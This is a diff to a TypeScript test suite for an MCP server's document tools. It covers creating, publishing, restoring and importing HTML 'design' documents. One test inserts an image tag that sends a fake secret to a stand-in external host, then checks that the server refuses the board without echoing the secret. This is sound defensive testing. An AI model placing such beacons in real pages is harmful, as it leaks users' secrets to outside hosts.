@@ -2,7 +2,11 @@
  * Share-link MCP tools against real PostgreSQL: owner-only, the URL is
  * returned once and never listed, revoke. Skipped without DATABASE_URL.
  */
+import { execFileSync } from "node:child_process";
 import { randomUUID } from "node:crypto";
+import { mkdtempSync, readFileSync, realpathSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { InMemoryTransport } from "@modelcontextprotocol/server";
 import { Client } from "@modelcontextprotocol/client";
@@ -26,9 +30,9 @@ describe.skipIf(!process.env.DATABASE_URL)("document MCP tools (database)", () =
   async function connect(
     p: Principal,
     scopes: string[] = ["documents:read", "documents:write"],
-    link: { canonicalUri?: string; publicOrigin?: string } = {},
+    link: { canonicalUri?: string; publicOrigin?: string; executor?: object } = {},
   ) {
-    const providers = { secrets: cipher, executor } as unknown as McpProviders;
+    const providers = { secrets: cipher, executor: link.executor ?? executor } as unknown as McpProviders;
     const canonicalUri = link.canonicalUri ?? "https://wardby.example/mcp";
     const mcp = buildMcpServer({ providers, db, config: { canonicalUri } });
     const ctx: McpRequestContext = {
@@ -100,6 +104,119 @@ describe.skipIf(!process.env.DATABASE_URL)("document MCP tools (database)", () =
   });
 
   const anchor = { type: "text" as const, quote: "hello world", prefix: "", suffix: "" };
+
+  describe("designs", () => {
+    const coffee = (p: string) =>
+      readFileSync(new URL(`../../core/documents/boards/fixtures/coffee/${p}`, import.meta.url), "utf8");
+    const coffeeFiles = (): Record<string, string> => ({
+      "manifest.json": coffee("manifest.json"),
+      "brand.md": coffee("brand.md"),
+      ...Object.fromEntries(
+        ["home", "menu", "about", "visit"].map((id) => [`boards/${id}.html`, coffee(`boards/${id}.html`)]),
+      ),
+    });
+
+    it("creates, reads, lists, publishes and restores a design", async () => {
+      const call = await connect(owner);
+      const created = await call("create_document", { kind: "design", title: "Coffee", files: coffeeFiles() });
+      expect(created.isError).toBe(false);
+      expect(created.json).toMatchObject({ kind: "design", warnings: [] });
+      const docId = created.json.documentId as string;
+      const got = await call("get_document", { documentId: docId });
+      expect(got.json.kind).toBe("design");
+      expect(got.json.files).toHaveLength(6);
+      expect(got.json.files[0]).toMatchObject({ path: expect.any(String), bytes: expect.any(Number) });
+      expect(got.json.documentText).toMatch(/^<untrusted_tool_output>\nTitle: Coffee\n/);
+      expect(got.json.documentText).toContain("--- boards/home.html ---");
+      expect(got.json.warnings).toEqual([]);
+
+      const pub = await call("publish_version", { documentId: docId, files: coffeeFiles() });
+      expect(pub.json).toMatchObject({ number: 2, warnings: [] });
+      const mismatch = await call("publish_version", { documentId: docId, markdown: "x" });
+      expect(mismatch.isError).toBe(true);
+      expect(mismatch.text).toContain("document_format_mismatch");
+
+      // An older version reads as files too; restore works on a design.
+      const v1 = await call("get_document", { documentId: docId, versionNumber: 1 });
+      expect(v1.json).toMatchObject({ kind: "design", number: 1 });
+      expect(v1.json.documentText).toContain("--- boards/menu.html ---");
+      const restored = await call("restore_document_version", { documentId: docId, versionNumber: 1, baseNumber: 2 });
+      expect(restored.json).toMatchObject({ number: 3, restored: 1 });
+
+      const listed = await call("list_documents", { ownedOnly: true });
+      expect(listed.json.documents.find((d: any) => d.documentId === docId).kind).toBe("design");
+      const doc = await call("create_document", { title: "Plain", markdown: "x" });
+      expect(doc.json.kind).toBe("document");
+      expect(
+        (await call("list_documents", { ownedOnly: true })).json.documents.find(
+          (d: any) => d.documentId === doc.json.documentId,
+        ).kind,
+      ).toBe("document");
+      expect((await call("create_document", { kind: "design", title: "N" })).text).toContain(
+        "document_format_mismatch",
+      );
+      expect((await call("create_document", { title: "N", files: coffeeFiles() })).text).toContain(
+        "document_format_mismatch",
+      );
+    });
+
+    it("refuses an external reference without echoing it", async () => {
+      const call = await connect(owner);
+      const files = coffeeFiles();
+      files["boards/home.html"] = files["boards/home.html"].replace(
+        "</body>",
+        '<img src="https://x.test/a.png?k=FAKE-SECRET-MCP"></body>',
+      );
+      const bad = await call("create_document", { kind: "design", title: "Bad", files });
+      expect(bad.isError).toBe(true);
+      expect(bad.text.startsWith("board_format_invalid")).toBe(true);
+      expect(bad.text).not.toContain("FAKE-SECRET-MCP");
+    });
+
+    it("imports a design from a linked repository directory at baseRef", async () => {
+      const root = realpathSync(mkdtempSync(join(tmpdir(), "wardby-design-")));
+      execFileSync("git", ["init", "-q", root]);
+      const previous = process.env.LOCAL_REPO_ROOTS;
+      process.env.LOCAL_REPO_ROOTS = root;
+      try {
+        const served = Object.fromEntries(Object.entries(coffeeFiles()).map(([p, t]) => [`design/${p}`, t]));
+        const reads: { repository: string; baseRef: string }[] = [];
+        const reader = {
+          ...executor,
+          readCodingRepositoryFile: async (i: { repository: string; baseRef: string; path: string }) => {
+            reads.push({ repository: i.repository, baseRef: i.baseRef });
+            return served[i.path] ?? null;
+          },
+        };
+        const call = await connect(owner, undefined, { executor: reader });
+        const link = {
+          kind: "design",
+          title: "Imported",
+          agentId: codingAgentId,
+          repository: `local:${root}`,
+          path: "design",
+        };
+        expect((await call("create_document", { ...link })).text).toContain("document_repo_link_invalid");
+        expect((await call("create_document", { ...link, path: "design/", baseRef: "main" })).text).toContain(
+          "document_repo_link_invalid",
+        );
+        const created = await call("create_document", { ...link, baseRef: "main" });
+        expect(created.isError).toBe(false);
+        expect(reads[0]).toEqual({ repository: `local:${root}`, baseRef: "main" });
+        const got = await call("get_document", { documentId: created.json.documentId });
+        expect(got.json.files.map((f: { path: string }) => f.path)).toContain("boards/visit.html");
+        const via = await db.documentVersion.findFirst({ where: { documentId: created.json.documentId } });
+        expect(via?.via).toBe("import");
+        const noReader = await connect(owner);
+        expect((await noReader("create_document", { ...link, baseRef: "main" })).text).toContain(
+          "document_repo_link_invalid",
+        );
+      } finally {
+        if (previous === undefined) delete process.env.LOCAL_REPO_ROOTS;
+        else process.env.LOCAL_REPO_ROOTS = previous;
+      }
+    });
+  });
 
   describe("links over stdio", () => {
     const STDIO = "urn:wardby:local-stdio";
